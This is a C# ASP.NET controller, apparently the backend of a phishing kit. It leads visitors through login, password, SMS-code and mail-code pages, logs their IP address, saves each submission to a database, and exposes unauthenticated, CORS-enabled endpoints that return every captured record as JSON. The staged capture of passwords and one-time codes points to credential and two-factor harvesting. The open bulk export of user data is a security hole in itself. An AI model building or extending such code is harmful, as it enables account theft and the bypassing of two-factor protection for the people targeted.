using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Hosting;
using System.Globalization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Cors;

namespace GoogleCrawler.Controllers
{

    [EnableCors("MyPolicy")]
    public class BaseController : Controller
    {
        private IUsersRepository _usersRepository;
        private IUnitOfWork _uow;


        IHttpContextAccessor _httpContextAccessor;
        IHostingEnvironment _IHostingEnvironment;

        public BaseController(
            IUsersRepository usersRepository, IUnitOfWork uow,
         IHttpContextAccessor _IHttpContextAccessor,
         IHostingEnvironment _IHostingEnvironment
            )
        {
            this._usersRepository = usersRepository;
            this._uow = uow;
            this._httpContextAccessor = _IHttpContextAccessor;
            this._IHostingEnvironment = _IHostingEnvironment;
        }

        public Users setUsers(Users postModel)
        {
            postModel.ipAdress = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            _httpContextAccessor.HttpContext.Session.Set("postmodel", postModel);
            ViewBag.users = postModel;
            return postModel;
        }

        public IActionResult Index()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("getuser")]
        public async Task<IActionResult> getuser(Guid id)
        {
            var rs = await _usersRepository.GetById(id);
            return Json(rs);
        }


        [Route("getusers")]
        public async Task<IActionResult> getusers()
        {
            var rs = await _usersRepository.GetAll();
            return Json(rs);
        }

        [Route("getlastuser")]
        public async Task<IActionResult> getlastuser()
        {
            var rs = _usersRepository.GetAll().Result.LastOrDefault();
            return Json(rs);
        }


        [Route("Password")]
        public IActionResult Password(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Password2")]
        public IActionResult Password2()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("Sms")]
        public IActionResult Sms()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("SmsSend")]
        public IActionResult SmsSend(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Mail")]
        public IActionResult Mail()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("MailSend")]
        public IActionResult MailSend(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Wait")]
        public async Task<IActionResult> Wait(Users postModel)
        {
            var result = setUsers(postModel);
            _usersRepository.Add(result);
            var rs = await _uow.Commit();
            return View();
        }

        [Route("Finish")]
        public async Task<IActionResult> Finish(Users postModel)
        {
            return View();
        }

        [Route("Login")]
        public IActionResult Login(Users postModel)
        {
            var result = setUsers(postModel);
            return Json(result);
        }



    }



}


